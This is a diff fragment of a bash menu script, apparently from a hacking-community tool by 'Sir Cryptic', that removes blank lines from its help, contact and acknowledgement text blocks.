 Image name Along with file type instead of typing the image location aswell
 For eg: instead of /home/username/Pictures/lulz.png
 I would just type : lulz.png
-
-
                           Press ENTER To Go Back To The Main Menu
-
 '
 read
 
@@ -2312,10 +2746,8 @@ clear
 echo -e '\e[1;33m
 \e[0m
  \e[1;31m
-
  If You Have Any Issues Then Feel Free 
  To Contact Me (Sir Cryptic) Either Via:
-
  FORUMS,DISCORD,EMAIL
  
  no-reply@nullsec.online
@@ -2324,16 +2756,11 @@ echo -e '\e[1;33m
 echo -e '\e[1;34m
 I Would Personally Like To Thank \e[1;33mJack \e[1;34m Over @ \e[1;32m Kali Hacking Community Discord Server\e[1;34m
 For Being My Motivation To Keep Making This Tool, You Can Join Using The Link Below.
-
 https://discord.com/invite/aTbExhe
-
 I Would Also Like To Thank \e[1;35mKiera<3 \e[1;34m over @KCH For Making Me Aware Of Bugs
 Without People Like This I Probably Would Have Been Oblivious. 
-
 So Thankyou Once Again To All Those That Made This Possible & Gave Me Inspiration. 
-
 - Sir Cryptic
-
                           Press ENTER To Go Back To The Main Menu
 '
 read
